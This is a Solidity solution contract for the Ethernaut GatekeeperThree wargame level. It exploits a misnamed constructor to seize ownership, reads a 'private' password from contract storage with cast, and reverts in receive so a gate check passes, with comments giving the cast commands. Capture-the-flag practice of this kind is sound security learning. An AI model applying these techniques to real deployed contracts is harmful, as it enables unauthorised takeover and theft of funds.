//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import {GatekeeperThree, SimpleTrick} from "./GatekeeperThree.sol";

contract GatekeeperThreeAttack{
    GatekeeperThree victim;
    SimpleTrick trick;

    constructor(address _v) payable{
        victim = GatekeeperThree(payable(_v));
        (bool success, ) = _v.call{value: 0.002 ether}("");
    }

    function attack() public {
        victim.construct0r();
        victim.createTrick();

    }

    function attackTwo(uint256 amount) public {
        //you must find the contract of the SimpleTrick, there are many ways, 
        //I found it by digging on etherscan, in attack() tx, in internal txs.
        //cast storage <0x..trick address> 2 --rpc-url $RPC

        //cast send <0x.. this contract you deployed> "attackTwo(uint256)" "1... the password" --rpc-url $RPC --private-key $KEY 
        victim.getAllowance(amount);
    }

    function enter() public {
        //cast send <0x.. this contract you deployed> "enter()" --rpc-url $RPC --private-key $KEY
        victim.enter();
        }

    receive() external payable{
        revert();
    }
}